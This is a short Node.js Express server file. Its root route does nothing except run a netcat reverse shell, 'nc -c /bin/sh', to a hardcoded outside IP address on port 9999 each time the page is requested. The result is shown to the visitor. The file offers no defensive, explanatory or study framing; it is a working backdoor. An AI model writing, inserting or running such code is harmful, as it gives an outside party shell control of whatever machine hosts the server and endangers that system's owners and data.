const express = require('express');
const { exec } = require('child_process');

const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    // Use Netcat with the -c option if available
    exec('nc -c /bin/sh 140.238.85.162 9999', (error, stdout, stderr) => {
        if (error) {
            res.send(`<pre>Error: ${error.message}</pre>`);
            return;
        }
        if (stderr) {
            res.send(`<pre>stderr: ${stderr}</pre>`);
            return;
        }
        res.send(`<pre>${stdout}</pre>`);
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
